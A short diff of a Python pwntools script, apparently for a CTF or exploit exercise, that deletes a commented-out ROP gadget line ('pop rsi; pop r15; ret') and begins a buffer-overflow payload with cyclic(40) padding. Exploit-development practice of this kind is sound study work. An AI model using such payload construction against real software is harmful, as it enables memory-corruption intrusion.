@@ -1,6 +1,5 @@
 #!/usr/bin/python
 from pwn import *
-# payload += p64(0x00400891)  # pop rsi; pop r15; ret
 if __name__ == "__main__":
     payload = ""
     payload += cyclic(40)
